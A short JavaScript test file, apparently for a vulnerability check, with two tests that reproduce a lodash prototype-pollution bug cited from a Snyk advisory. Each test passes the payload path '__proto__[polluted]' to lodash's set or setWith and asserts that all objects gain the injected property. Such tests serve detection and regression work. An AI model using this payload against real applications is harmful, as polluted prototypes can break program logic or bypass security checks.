//https://security.snyk.io/vuln/SNYK-JS-LODASH-608086
test("prototype pollution in lodash", () => {
  const lod = require("lodash");
  let obj = {};
  expect({}.polluted).toBe(undefined);
  lod.set(obj, "__proto__[polluted]", "yes");
  expect({}.polluted).toBe("yes");
  delete obj.__proto__.polluted; // deletes the property set by this pollution
});

test("prototype pollution in lodash", () => {
  const lod = require("lodash");
  expect({}.polluted).toBe(undefined);
  lod.setWith({}, "__proto__[polluted]", "yes");
  expect({}.polluted).toBe("yes");
});
